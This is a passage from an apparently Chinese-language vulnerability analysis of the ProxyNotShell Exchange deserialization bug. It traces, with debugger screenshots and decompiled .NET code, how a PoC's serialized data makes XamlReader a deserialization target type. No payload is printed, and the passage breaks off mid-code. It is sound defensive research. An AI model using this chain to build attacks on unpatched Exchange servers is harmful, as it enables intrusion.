&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-w &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span> -m &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在以下几个地方下断点&lt;/p>
&lt;ul>
&lt;li>System.Runtime.Serialization.Formatters.Binary
&lt;ul>
&lt;li>ObjectReader.Deserialize&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>发送PoC，调试器在断点处断下，此时调用栈如下:&lt;/p>
&lt;p>
&lt;img alt="Untitled" src="https://www.ch35tnut.site/images/vulnerability/proxy-not-shell.zh-cn.assets/4.png" />&lt;/p>
&lt;p>此时为Exchange试图将Props标签内的序列化数据通过ConvertTo函数转化为System.Exception对象，System.Runtime.Serialization.Formatters.Binary.ObjectReader.Deserialize会通过serParser.Run()解析读入内存中的base64解码数据。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-csharp" data-lang="csharp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">internal&lt;/span> &lt;span style="color:#66d9ef">object&lt;/span> Deserialize(HeaderHandler handler, __BinaryParser serParser, &lt;span style="color:#66d9ef">bool&lt;/span> fCheck, &lt;span style="color:#66d9ef">bool&lt;/span> isCrossAppDomain, IMethodCallMessage methodCallMessage)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>.....
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> serParser.Run();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">this&lt;/span>.bFullDeserialization)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.m_objectManager.DoFixups();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (!&lt;span style="color:#66d9ef">this&lt;/span>.bMethodCall &amp;amp;&amp;amp; !&lt;span style="color:#66d9ef">this&lt;/span>.bMethodReturn)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">this&lt;/span>.TopObject == &lt;span style="color:#66d9ef">null&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> SerializationException(Environment.GetResourceString(&lt;span style="color:#e6db74">&amp;#34;Serialization_TopObject&amp;#34;&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">this&lt;/span>.HasSurrogate(&lt;span style="color:#66d9ef">this&lt;/span>.TopObject.GetType()) &amp;amp;&amp;amp; &lt;span style="color:#66d9ef">this&lt;/span>.topId != &lt;span style="color:#ae81ff">0L&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.TopObject = &lt;span style="color:#66d9ef">this&lt;/span>.m_objectManager.GetObject(&lt;span style="color:#66d9ef">this&lt;/span>.topId);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">this&lt;/span>.TopObject &lt;span style="color:#66d9ef">is&lt;/span> IObjectReference)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.TopObject = ((IObjectReference)&lt;span style="color:#66d9ef">this&lt;/span>.TopObject).GetRealObject(&lt;span style="color:#66d9ef">this&lt;/span>.m_context);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">this&lt;/span>.bFullDeserialization)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.m_objectManager.RaiseDeserializationEvent();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (handler != &lt;span style="color:#66d9ef">null&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.handlerObject = handler(&lt;span style="color:#66d9ef">this&lt;/span>.headers);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">this&lt;/span>.bMethodCall)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">object&lt;/span>[] callA = &lt;span style="color:#66d9ef">this&lt;/span>.TopObject &lt;span style="color:#66d9ef">as&lt;/span> &lt;span style="color:#66d9ef">object&lt;/span>[];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.TopObject = &lt;span style="color:#66d9ef">this&lt;/span>.binaryMethodCall.ReadArray(callA, &lt;span style="color:#66d9ef">this&lt;/span>.handlerObject);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">this&lt;/span>.bMethodReturn)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">object&lt;/span>[] returnA = &lt;span style="color:#66d9ef">this&lt;/span>.TopObject &lt;span style="color:#66d9ef">as&lt;/span> &lt;span style="color:#66d9ef">object&lt;/span>[];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.TopObject = &lt;span style="color:#66d9ef">this&lt;/span>.binaryMethodReturn.ReadArray(returnA, methodCallMessage, &lt;span style="color:#66d9ef">this&lt;/span>.handlerObject);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.TopObject;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>serParser.Run()会将内存序列化数据试图转化为&lt;em>System.UnitySerializationHolder&lt;/em> 对象，代码如下，通过循环读取各个标志位调用不同方法从内存中读取指定类型的数据。构造出&lt;em>System.UnitySerializationHolder&lt;/em>对象并载入&lt;em>System.UnitySerializationHolder.AssemblyName&lt;/em>对应的DLL。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-csharp" data-lang="csharp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">internal&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> Run()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">bool&lt;/span> flag = &lt;span style="color:#66d9ef">true&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.ReadBegin();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.ReadSerializationHeaderRecord();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> (flag)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> BinaryHeaderEnum binaryHeaderEnum = BinaryHeaderEnum.Object;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> BinaryTypeEnum binaryTypeEnum = &lt;span style="color:#66d9ef">this&lt;/span>.expectedType;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (binaryTypeEnum != BinaryTypeEnum.Primitive)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (binaryTypeEnum - BinaryTypeEnum.String &amp;gt; &lt;span style="color:#ae81ff">6&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> SerializationException(Environment.GetResourceString(&lt;span style="color:#e6db74">&amp;#34;Serialization_TypeExpected&amp;#34;&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">byte&lt;/span> b = &lt;span style="color:#66d9ef">this&lt;/span>.dataReader.ReadByte();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> binaryHeaderEnum = (BinaryHeaderEnum)b;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">switch&lt;/span> (binaryHeaderEnum)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> BinaryHeaderEnum.Object:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.ReadObject();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> BinaryHeaderEnum.ObjectWithMap:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>.....
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">this&lt;/span>.ReadObjectWithMap(binaryHeaderEnum);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> BinaryHeaderEnum.ObjectWithMapTyped:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.ReadObjectWithMapTyped(binaryHeaderEnum);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> BinaryHeaderEnum.ObjectString:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.ReadObjectString(binaryHeaderEnum);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> BinaryHea......flag2)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ObjectProgress objectProgress = (ObjectProgress)&lt;span style="color:#66d9ef">this&lt;/span>.stack.Peek();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (objectProgress == &lt;span style="color:#66d9ef">null&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.expectedType = BinaryTypeEnum.ObjectUrt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.expectedTypeInformation = &lt;span style="color:#66d9ef">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> flag2 = &lt;span style="color:#66d9ef">true&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> flag2 = objectProgress.GetNext(&lt;span style="color:#66d9ef">out&lt;/span> objectProgress.expectedType, &lt;span style="color:#66d9ef">out&lt;/span> objectProgress.expectedTypeInformation);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.expectedType = objectProgress.expectedType;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.expectedTypeInformation = objectProgress.expectedTypeInformation;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (!flag2)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.prs.Init();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (objectProgress.memberValueEnum == InternalMemberValueE.Nested)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.prs.PRparseTypeEnum = InternalParseTypeE.MemberEnd;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.prs.PRmemberTypeEnum = objectProgress.memberTypeEnum;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.prs.PRmemberValueEnum = objectProgress.memberValueEnum;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.objectReader.Parse(&lt;span style="color:#66d9ef">this&lt;/span>.prs);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.prs.PRparseTypeEnum = InternalParseTypeE.ObjectEnd;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.prs.PRmemberTypeEnum = objectProgress.memberTypeEnum;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.prs.PRmemberValueEnum = objectProgress.memberValueEnum;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.objectReader.Parse(&lt;span style="color:#66d9ef">this&lt;/span>.prs);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.stack.Pop();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.PutOp(objectProgress);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;img alt="Untitled" src="https://www.ch35tnut.site/images/vulnerability/proxy-not-shell.zh-cn.assets/5.png" />&lt;/p>
&lt;p>将XamlReader读入内存&lt;/p>
&lt;p>
&lt;img alt="Untitled" src="https://www.ch35tnut.site/images/vulnerability/proxy-not-shell.zh-cn.assets/6.png" />&lt;/p>
&lt;p>在System.Runtime.Serialization.Formatters.Binary.ObjectReader.Deserialize中将通过&lt;/p>
&lt;p>&lt;code>this.TopObject = ((IObjectReference)this.TopObject).GetRealObject(this.m_context);&lt;/code> 将&lt;em>System.UnitySerializationHolder&lt;/em>转化为Type类型的XamlReader对象，并通过反射获取了XamlReader类的各个属性。&lt;/p>
&lt;p>
&lt;img alt="Untitled" src="https://www.ch35tnut.site/images/vulnerability/proxy-not-shell.zh-cn.assets/7.png" />&lt;/p>
&lt;p>在最后将this.TopObject作为返回值返回，在经过一系列函数调用返回后，可以在调试器看到ConvertTo函数返回了Object类型对象obj2，可以看到其为类型为Type类型的XamlReader对象，之后ReadOneObject返回该对象。&lt;/p>
&lt;p>
&lt;img alt="Untitled" src="https://www.ch35tnut.site/images/vulnerability/proxy-not-shell.zh-cn.assets/8.png" />&lt;/p>
&lt;p>注：Type类型是Exchange内定义的抽象类，如下所示：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-csharp" data-lang="csharp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">namespace&lt;/span> System
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Token: 0x02000148 RID: 328&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e"> [ClassInterface(ClassInterfaceType.None)]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e"> [ComDefaultInterface(typeof(_Type))]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e"> [ComVisible(true)]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e"> [__DynamicallyInvokable]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e"> [Serializable]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">abstract&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Type&lt;/span> : MemberInfo, _Type, IReflect
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Token: 0x17000217 RID: 535&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// (get) Token: 0x060013E6 RID: 5094 RVA: 0x0003BE2A File Offset: 0x0003A02A&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">override&lt;/span> MemberTypes MemberType
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">get&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> MemberTypes.TypeInfo;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>(应该可以理解obj2为实现了Type这个抽象类的XamlReader对象，而XamlReader继承了Object这个父类，所以可以使用Object类型对象接受)&lt;/p>
&lt;p>在调用栈内，ReadOneObject由ReadProperties调用，回到ReadProperties逻辑中，Exchange会将ReadOneObject返回的的Type类型的XamlReader对象添加到dso.adaptedMembers中，而后这个dso将会返回到调用栈内的ReadOneObject函数。&lt;/p>
&lt;p>
&lt;img alt="Untitled" src="https://www.ch35tnut.site/images/vulnerability/proxy-not-shell.zh-cn.assets/9.png" />&lt;/p>
&lt;p>继续调试，此时嵌套对象的内层对象已反序列化，开始反序列化外层对象，回到程序中，从下图可以看到，将会调用psobject.GetTargetTypeForDeserialization获取目标反序列化类型，此时psobject内的adaptedMembers内有名为TargetTypeForDeserialization的对象，其类型为Type的XamlReader对象&lt;/p>
&lt;p>
&lt;img alt="Untitled" src="https://www.ch35tnut.site/images/vulnerability/proxy-not-shell.zh-cn.assets/10.png" />&lt;/p>
&lt;p>进入到psobject.GetTargetTypeForDeserialization内，调用this.GetPSStandardMember试图获取PSMemberInfo 对象，而后将其强转为Type对象返回，若失败则返回null&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-csharp" data-lang="csharp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">internal&lt;/span> Type GetTargetTypeForDeserialization(TypeTable backupTypeTable)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PSMemberInfo psstandardMember = &lt;span style="color:#66d9ef">this&lt;/span>.GetPSStandardMember(backupTypeTable, &lt;span style="color:#e6db74">&amp;#34;TargetTypeForDeserialization&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (psstandardMember != &lt;span style="color:#66d9ef">null&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> psstandardMember.Value &lt;span style="color:#66d9ef">as&lt;/span> Type;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在GetPSStandardMember函数内，调用PSObject.TypeTableGetMemberDelegate并传入当前对象、允许的类型列表和硬编码PSStandardMembers以初始化PSMemberSet 对象。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-csharp" data-lang="csharp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">internal&lt;/span> PSMemberInfo GetPSStandardMember(TypeTable backupTypeTable, &lt;span style="color:#66d9ef">string&lt;/span> memberName)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PSMemberInfo psmemberInfo = &lt;span style="color:#66d9ef">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> TypeTable typeTable = (backupTypeTable != &lt;span style="color:#66d9ef">null&lt;/span>) ? backupTypeTable : &lt;span style="color:#66d9ef">this&lt;/span>.GetTypeTable();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (typeTable != &lt;span style="color:#66d9ef">null&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PSMemberSet psmemberSet = PSObject.TypeTableGetMemberDelegate&amp;lt;PSMemberSet&amp;gt;(&lt;span style="color:#66d9ef">this&lt;/span>, typeTable, &lt;span style="color:#e6db74">&amp;#34;PSStandardMembers&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (psmemberSet != &lt;span style="color:#66d9ef">null&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> psmemberSet.ReplicateInstance(&lt;span style="color:#66d9ef">this&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> psmemberInfo = &lt;span style="color:#66d9ef">new&lt;/span> PSMemberInfoIntegratingCollection&amp;lt;PSMemberInfo&amp;gt;(psmemberSet, PSObject.GetMemberCollection(PSMemberViewTypes.All, backupTypeTable))[memberName];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (psmemberInfo == &lt;span style="color:#66d9ef">null&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> psmemberInfo = (&lt;span style="color:#66d9ef">this&lt;/span>.InstanceMembers[&lt;span style="color:#e6db74">&amp;#34;PSStandardMembers&amp;#34;&lt;/span>] &lt;span style="color:#66d9ef">as&lt;/span> PSMemberSet);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> psmemberInfo;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;img alt="Untitled" src="https://www.ch35tnut.site/images/vulnerability/proxy-not-shell.zh-cn.assets/11.png" />&lt;/p>
&lt;p>而后调用PSMemberInfoIntegratingCollection构造函数，其中PSMemberInfoIntegratingCollection类继承了PSMemberInfo类。传入构造函数的collections变量来源于&lt;code>PSObject.GetMemberCollection(PSMemberViewTypes.All, backupTypeTable)&lt;/code> 函数的返回值，构造函数将collections赋给当前对象的collections属性。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-csharp" data-lang="csharp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">internal&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">PSMemberInfoIntegratingCollection&lt;/span>&amp;lt;T&amp;gt; : PSMemberInfoCollection&amp;lt;T&amp;gt;, IEnumerable&amp;lt;T&amp;gt;, IEnumerable &lt;span style="color:#66d9ef">where&lt;/span> T : PSMemberInfo
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Token: 0x06002AC3 RID: 10947 RVA: 0x000C35F4 File Offset: 0x000C17F4&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> GenerateAllReservedMembers()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
